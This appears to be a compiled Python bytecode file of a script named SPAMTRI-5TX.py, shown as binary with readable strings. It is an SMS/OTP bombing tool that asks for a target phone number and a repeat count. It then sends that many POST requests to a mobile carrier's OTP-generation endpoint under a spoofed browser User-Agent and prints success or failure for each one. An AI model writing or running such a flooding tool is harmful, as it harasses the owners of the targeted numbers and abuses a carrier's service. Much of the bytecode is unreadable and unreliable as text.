U
    �4�^\  �                   @   s�   d dl Z d dlZd dlZd dlZd dlmZ dZdZdZdZ	dZ
dZd	Zd
ZdZdZdZdZdZd	ZdZdZdZdZdZdZdZe�d� dd� Ze��  dd� Ze�  dS )�    N)�logoz/https://registrasi.tri.co.id/daftar/generateOTPz[32;1mz[0;32mz[34;1mz[36;1mz[31;1mz[0mz[37;1mz[35;1mz[3;1mz[33;1mz[0;33mz[30;1mz[31mz[1;32mz[33mz[34mz[35mz[36mz[37m�clearc                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )N�
gl�l��?)�sys�stdout�write�flush�time�sleep)�s�c� r   �/sdcard/SPAMTRI-5TX.py�ketik   s    
r   c                  C   s�   t t� dt� dt� dt� d��} tt t� dt� dt� dt� d���}d	d
i}d| i}t|�D ]r}tjt	|d�}d|j
kr�tt� dt� dt� dt� | � dt� d�� q\tt� dt� dt� dt� | � dt� d�� q\d S )N�<zBENJAMIN IDz> zMASUKAN NO TARGET:�[�!z] zJUMLAH:z
User-AgentzzMozilla/5.0 (Linux; Android 5.1; CPH1605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36Zmsisdn)�dataZ200z].� ZSUKSESZGAGAL)�input�mens�kuli�sma�int�sd�range�requestsZpost�url�text�print�gt)�gZzxZagentr   �xZabir   r   r   �spam   s     $
,r#   )r   �osr	   r   Zabinkunsr   r   r!   r    Zbt�b�mr   �p�uZzes�kZkt�aZaqur   Zmenr   r   Zsmpr   �z�systemr   Zbannerr#   r   r   r   r   �<module>   s6    
